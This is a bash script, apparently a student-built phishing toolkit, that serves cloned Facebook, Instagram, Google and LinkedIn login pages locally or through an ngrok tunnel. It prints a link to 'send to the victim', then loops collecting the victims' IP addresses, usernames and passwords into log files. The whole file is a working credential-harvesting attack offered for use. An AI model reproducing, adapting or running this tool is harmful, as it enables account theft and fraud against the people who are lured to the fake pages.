#!/bin/bash

trap 'printf "\n";stop;exit 1' 2
trap user_interrupt SIGINT
trap user_interrupt SIGTSTP

user_interrupt(){
        printf "******************************************"
        printf "\t CTRL + C Pressed !!\n"
        sleep 2
        printf "******************************************"
        exit 1
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e .nexlink ]]; then
rm -rf .nexlink
fi

}

reqs() {

command -v php > /dev/null 2>&1 || { printf "\n Packages are not Installed ! type \"bash setup\"\n\n"; exit 1; }
command -v curl > /dev/null 2>&1 || { printf "\n Packages are not Installed ! type \"bash setup\"\n\n"; exit 1; }
command -v ssh > /dev/null 2>&1 || { printf "\n Packages are not Installed ! type \"bash setup\"\n\n"; exit 1; }
command -v unzip > /dev/null 2>&1 || { printf "\n Packages are not Installed ! type \"bash setup\"\n\n"; exit 1; }

if [[ -d .htr ]]; then
printf ""
else
printf " Packages are not Found! type \"bash setup\"\n\n"
exit 1 
fi

if [[ -d .Modules ]]; then
printf ""
else
printf "\n Packages are not Found! type \"bash setup\"\n\n"
exit 1 
fi

if [[ -d .htr/www ]]; then
rm -rf .htr/www
mkdir .htr/www
else
mkdir .htr/www
fi

}

banner() {

clear
printf "**********************************************************************************"\
printf "\tPhishing Tool made by - "
printf "\t   Rishi Rajpal 19BCY10027"
printf "\t   Sripathi 19BCY10123"
printf "\t   Shivam Agrawal 19BCY10140"
printf "\t   Krishna Agrawal 19BCY10177\n\n"
printf "\t   Students of VIT Bhopal University."

printf "**********************************************************************************"

}

smallbanner() {

clear
printf "           ***    ******         *  *******   "
printf "         *        *   *          *       *    "
printf "       *    ***   *  *           *      *     "
printf "       *       *  ***     *****  *     *      "
printf "         *    *   *  *           *    *       "
printf "           ***    *    *         *   *        "

}

menu() {

printf "     Choose your Phishing Site-  \n"

printf "\t1.  Facebook "
printf "\t2.  Instagram   "
printf "\t3.  Google     "
printf "\t4.  Linkedin  "
printf "\t0.  Exit  "

read -p $' Select an option: ' menu_option

if [[ $menu_option == 1  ]]; then
facebook
elif [[ $menu_option == 2  ]]; then
instagram
elif [[ $menu_option == 3  ]]; then
gmail
elif [[ $menu_option == 4  ]]; then
website="linkedin"
tunnel_menu
elif [[ $menu_option == 99 ]]; then
about
elif [[ $menu_option == 0  ]]; then

printf "  Thank You!! \n"

exit 1

else
printf "\n\n  Invalid option! \n"
sleep 1
banner
menu
fi

}

facebook(){
printf " \n"
printf " 1. Traditional Login Page.\n"
printf " 2. Advanced Voting Poll Login Page.\n"
printf " 3. Fake Security Login Page.\n"
printf " 4. Facebook Messenger Login Page.\n"
printf "\n"
read -p $'  Select an option: ' fb_option


if [[ $fb_option == 1  ]]; then
website="facebook"
tunnel_menu
elif [[ $fb_option == 2 ]]; then
website="fb_advanced"
tunnel_menu
elif [[ $fb_option == 3  ]]; then
website="fb_security"
tunnel_menu
elif [[ $fb_option == 4  ]]; then
website="fb_messenger"
tunnel_menu

else
printf "\n\n   Invalid option! \n"
sleep 1
banner
menu
fi

}
instagram(){
printf " \n"
printf " 1. Login Page.\n"
printf " 2. Auto Followers Login Page.\n"
printf " 3. Blue Badge Verify Login Page.\n"
printf "\n"
read -p $'  Select an option: ' ig_option


if [[ $ig_option == 1  ]]; then
website="instagram"
tunnel_menu
elif [[ $ig_option == 2  ]]; then
website="ig_followers"
tunnel_menu
elif [[ $ig_option == 3  ]]; then
website="ig_verify"
tunnel_menu

else
printf "\n\n  Invalid option! \n"
sleep 1
banner
menu
fi
}

gmail(){
printf " \n"
printf " 1. Gmail's Old Login Page.\n"
printf " 2. Gmail's New Login Page.\n"
printf " 3. Voting Poll Page.\n"
printf "\n"
read -p $'  Select an option: ' gmail_option


if [[ $gmail_option == 1  ]]; then
website="google"
tunnel_menu
elif [[ $gmail_option == 2 ]]; then
website="google_new"
tunnel_menu
elif [[ $gmail_option == 3 ]]; then
website="google_poll"
tunnel_menu

else
printf "\n\n  Invalid option! \n"
sleep 1
banner
menu
fi

}
vk(){
printf " \n"
printf "  Login Page\n"
printf "  Advanced Voting Poll Login Page\n"
printf "\n"
read -p $'  Select an option: ' vk_option


if [[ $vk_option == 1 || $vk_option == 01 ]]; then
website="vk"
tunnel_menu
elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
website="vk_poll"
tunnel_menu

else
printf "\n\n  Invalid option! \n"
sleep 1
banner
menu
fi

}

about() {

clear
sleep 2
printf "           ***    ******         *  *******   "
printf "         *        *   *          *       *    "
printf "       *    ***   *  *           *      *     "
printf "       *       *  ***     *****  *     *      "
printf "         *    *   *  *           *    *       "
printf "           ***    *    *         *   *        "

printf "  About creators - 0"
printf "  Exit - 99"
sleep 3

printf "\n"
read -p $'  Select an option: ' about_option

if [[ $about_option == 0 || $about_option == 00 ]]; then
sleep 1
banner
menu
elif [[ $about_option == 99 ]]; then
sleep 1
printf "\n"
printf "  Thanks You! \n"
printf "\n"
exit 1

else
printf "\n\n  Invalid option! \n"
sleep 1
banner
menu
fi
}

tunnel_menu() {

if [[ -e .nexlink ]]; then
rm -rf .nexlink
fi

if [[ -d .htr/www ]]; then
rm -rf .htr/www
mkdir .htr/www
else
mkdir .htr/www
fi

cp -rf .Modules/$website/* .htr/www
cp -f .Modules/ip.php .htr/www/

def_tunnel_menu="2"
smallbanner
printf "1.  LocalHost\n"
printf "2.  Ngrok\n"

read -p $' Select a Port Forwarding option: \n' tunnel_menu
tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"

if [[ $tunnel_menu == 1 ]]; then
start_localhost
elif [[ $tunnel_menu == 2 ]]; then
start_ngrok


else
printf "\n\n  Invalid option! \n"
sleep 1
banner
menu
fi

}

start_localhost() {

printf "\e[0m\n"
printf "  Staritng...http://127.0.0.1:5555 \n"
cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
smallbanner
printf "\n"
printf "  Host successful at :http://127.0.0.1:5555 \n"

datafound

}

start_ngrok() {

printf "\n"
printf "  Starting... ( http://127.0.0.1:5555 )\n"
sleep 1
printf "\n"
printf "  Running Ngrok ...\n"
cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 7
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

smallbanner
printf "\n"
printf " Phishing link generated, send it to the victim : %s \n" $ngrok_link

datafound
}

grab_ip() {

ip=$(grep -a 'IP:' .htr/www/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'

printf "\n"
printf " \t Victim IP: %s\n" $ip
printf "\n"
printf " \t Saved: ip.txt\n" $server
printf "\n"
cat .htr/www/ip.txt >> ip.txt

}

grab_creds() {

account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
printf "\n"
printf "    User ID : %s \n" $account
printf "\n"
printf "    Password: %s \n" $password
cat .htr/www/usernames.txt >> logs/$website.log
printf "\n"
printf "  Saved: logs/%s.log\n" $website
printf "\n"
printf "  Waiting for Next Login Info, Ctrl + C to exit.\n"

}

datafound() {

printf "\n"
printf "  Waiting for the victim to login... *Press Ctrl + C to exit.*\n"
printf "\n"
while [ true ]; do


if [[ -e ".htr/www/ip.txt" ]]; then
printf "\n"
printf "  Victim's IP Found!\n"
grab_ip
rm -rf .htr/www/ip.txt
fi
sleep 0.75
if [[ -e ".htr/www/usernames.txt" ]]; then
printf "\n"
printf " Login info Found!\n"
grab_creds
rm -rf .htr/www/usernames.txt
fi
sleep 0.75
done 

}

banner
reqs
menu